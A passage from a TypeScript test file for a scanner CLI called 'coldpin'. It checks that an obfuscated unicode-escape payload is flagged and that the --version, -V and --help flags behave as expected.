      oeTriage.observations.some((o) => o.path === "uni-str.js" && o.code === "HIGH_ENTROPY_OBFUSCATION"),
      "Dense \\uHHHH string payload must still trigger HIGH_ENTROPY_OBFUSCATION",
    );

    // 4. CLI --version and -V flags exit 0 and print `coldpin v${ENGINE_VERSION}`
    const cliPath = resolve("src/cli.ts");
    const runCli = (args: string[]) =>
      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
        let stdout = "";
        let stderr = "";
        p.stdout.on("data", (d) => (stdout += String(d)));
        p.stderr.on("data", (d) => (stderr += String(d)));
        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
      });

    const vLong = await runCli(["--version"]);
    assert.equal(vLong.code, 0, vLong.stderr);
    assert.equal(vLong.stdout.trim(), `coldpin v${ENGINE_VERSION}`);

    const vShort = await runCli(["-V"]);
    assert.equal(vShort.code, 0, vShort.stderr);
    assert.equal(vShort.stdout.trim(), `coldpin v${ENGINE_VERSION}`);

    const helpRes = await runCli(["--help"]);
    assert.equal(helpRes.code, 0, helpRes.stderr);
    assert.ok(helpRes.stdout.includes("--version, -V"));
  });
});
